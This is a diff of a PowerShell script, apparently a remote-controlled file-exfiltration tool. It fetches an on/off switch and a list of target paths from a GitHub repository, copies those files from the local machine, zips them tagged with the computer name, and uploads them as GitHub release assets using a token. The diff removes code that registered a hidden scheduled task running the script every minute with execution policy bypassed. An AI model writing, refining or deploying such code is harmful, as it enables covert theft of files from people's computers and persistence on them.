@@ -1,4 +1,4 @@
-# === console.ps1 Self-Registering Upload Script ===
+# === console.ps1 Upload Script ===
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
@@ -6,144 +6,113 @@ $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $repo = "ertgyhujkfghj/2"
 $token = $env:GH_TOKEN
 $taskName = "console"
-$logFile = "$env:TEMP\upload-log.txt"
 
-function Log($msg) {
-    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | $msg"
-    $line | Out-File -Append -FilePath $logFile -Encoding UTF8
-    Write-Host $line
-}
-
-function PauseOnError($msg) {
-    Log $msg
-    Start-Sleep -Seconds 60
+if (-not $token) {
+    Write-Host "❌ GH_TOKEN is not set, exiting script"
     exit 1
 }
 
-if (-not $token) {
-    PauseOnError "❌ GH_TOKEN is not set, exiting"
-}
-
-# ==== Time Window ====
+# ==== Time Window (19:30 - 00:00 daily) ====
 $now = Get-Date
 $startTime = [datetime]::Today.AddHours(19).AddMinutes(30)
 $endTime = [datetime]::Today.AddDays(1)
 if ($now -lt $startTime -or $now -ge $endTime) {
-    Log "🕒 Not in allowed time range (19:30 ~ 00:00), exiting"
+    Write-Host "🕒 Not in allowed time range (19:30 ~ 00:00), exiting"
     exit 0
 }
 
-# ==== Register Scheduled Task ====
-$taskExists = schtasks /Query /TN $taskName 2>$null
-if ($LASTEXITCODE -ne 0) {
-    Log "🛠️ Task $taskName not found, registering every 1 minute..."
-    $taskRun = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    schtasks /Create /TN $taskName /TR $taskRun /SC MINUTE /RI 1 /F
-    if ($LASTEXITCODE -eq 0) {
-        Log "✅ Task registered successfully (every 1 minute)"
-    } else {
-        PauseOnError "❌ Failed to register task"
-    }
-} else {
-    Log "ℹ️ Task $taskName already exists"
-}
-
-# ==== Remote Upload Control ====
+# ==== Read Upload Configuration ====
 $enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
 $pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"
 
+# ==== Check Upload Switch ====
 try {
     $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
     if ($enabled.Trim().ToLower() -ne "on") {
-        Log "🛑 Upload switch is OFF"
+        Write-Host "🛑 Upload switch is OFF, exiting"
         exit 0
     }
 } catch {
-    PauseOnError "❌ Failed to read upload switch: $($_.Exception.Message)"
+    Write-Warning "❌ Failed to read upload switch: $($_.Exception.Message)"
+    exit 1
 }
 
 # ==== Get Upload Paths ====
 try {
     $pathsRaw = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing
     $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_.Trim() -ne "" }
-    Log "📦 Upload paths:"
-    $uploadPaths | ForEach-Object { Log " - $_" }
+    Write-Host "`n📦 Upload paths:"
+    $uploadPaths | ForEach-Object { Write-Host " - $_" }
 } catch {
-    PauseOnError "❌ Failed to fetch upload paths: $($_.Exception.Message)"
+    Write-Warning "❌ Failed to fetch upload paths: $($_.Exception.Message)"
+    exit 1
 }
 
-# ==== Copy Files ====
+# ==== Copy Files to Temp (try to copy locked files too) ====
 $tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
 foreach ($path in $uploadPaths) {
     if (-not (Test-Path $path)) {
-        Log "⚠️ Path not found: $path"
+        Write-Warning "⚠️ Path does not exist, skipping: $path"
         continue
     }
+    $item = Get-Item $path -Force
     try {
-        $item = Get-Item $path -Force
-        $dest = Join-Path $tempDir $item.Name
-        Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
-        Log "✅ Copied: $($item.FullName)"
+        if ($item.PSIsContainer) {
+            $dest = Join-Path $tempDir $item.Name
+            Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
+            Write-Host "📁 Copied folder: $($item.FullName)"
+        } else {
+            $dest = Join-Path $tempDir $item.Name
+            Copy-Item -Path $item.FullName -Destination $dest -Force -ErrorAction SilentlyContinue
+            Write-Host "📄 Copied file: $($item.FullName)"
+        }
     } catch {
-        Log "⚠️ Copy failed: $($item.FullName)"
+        Write-Warning "⚠️ Failed to copy: $($item.FullName)"
     }
 }
 
-# ==== Include Log File ====
-Copy-Item $logFile -Destination "$tempDir\upload-log.txt" -Force -ErrorAction SilentlyContinue
-
-# ==== Create ZIP ====
+# ==== Compress into ZIP ====
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $computerName = $env:COMPUTERNAME
 $tag = "upload-$computerName-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
 $zipPath = "$env:TEMP\$tag.zip"
 try {
     [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
-    Log "📦 Created ZIP: $zipPath"
+    Write-Host "📦 Compressed to ZIP: $zipPath"
 } catch {
-    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-    PauseOnError "❌ Compression failed: $($_.Exception.Message)"
+    Write-Warning "❌ Compression failed: $($_.Exception.Message)"
+    Remove-Item $tempDir -Recurse -Force
+    exit 1
 }
 Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
-# ==== Check Existing Tag ====
-$releaseListUrl = "https://api.github.com/repos/$repo/releases"
+# ==== Upload to GitHub Release ====
+$uploadUrl = "https://api.github.com/repos/$repo/releases"
 $headers = @{
     Authorization = "token $token"
     "User-Agent"  = "upload-script"
+    Accept        = "application/vnd.github+json"
 }
 try {
-    $releases = Invoke-RestMethod -Uri $releaseListUrl -Headers $headers -Method GET
-    if ($releases | Where-Object { $_.tag_name -eq $tag }) {
-        Log "⏭️ ZIP already uploaded for tag $tag, skipping"
-        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-        exit 0
-    }
-} catch {
-    Log "⚠️ Failed to check existing releases: $($_.Exception.Message)"
-}
-
-# ==== Upload to GitHub Release ====
-try {
-    $release = Invoke-RestMethod -Uri $releaseListUrl -Headers $headers -Method POST -Body (@{
+    $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
         tag_name   = $tag
         name       = $tag
         draft      = $false
         prerelease = $false
     } | ConvertTo-Json -Depth 3)
 
-    $uploadUrl = "https://uploads.github.com/repos/$repo/releases/$($release.id)/assets?name=$(Split-Path $zipPath -Leaf)"
-    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers @{
+    $assetUrl = "https://uploads.github.com/repos/$repo/releases/$($release.id)/assets?name=$(Split-Path $zipPath -Leaf)"
+    Invoke-RestMethod -Uri $assetUrl -Method POST -Headers @{
         Authorization = "token $token"
         "Content-Type" = "application/zip"
-        "User-Agent" = "upload-script"
+        "User-Agent"   = "upload-script"
     } -InFile $zipPath
 
-    Log "✅ Upload successful: $tag.zip"
+    Write-Host "`n✅ Upload successful: $tag.zip"
 } catch {
-    PauseOnError "❌ Upload failed: $($_.Exception.Message)"
+    Write-Warning "❌ Upload failed: $($_.Exception.Message)"
 }
 
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
